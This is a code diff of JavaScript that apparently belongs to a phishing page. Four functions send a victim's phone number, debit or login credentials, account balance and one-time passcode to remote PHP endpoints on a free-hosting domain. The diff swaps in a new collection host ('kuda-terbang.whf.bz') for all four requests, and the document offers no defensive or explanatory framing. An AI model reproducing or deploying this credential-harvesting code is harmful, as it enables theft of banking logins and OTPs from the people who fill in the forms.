@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-c9h66x/no.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-c9h66x/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-c9h66x/login.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-c9h66x/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-c9h66x/saldo.php',
+        url: 'https://kuda-terbang.whf.bz/notif/v1-c9h66x/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -106,7 +106,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/v1-c9h66x/otp.php',
+      url: 'https://kuda-terbang.whf.bz/notif/v1-c9h66x/otp.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')
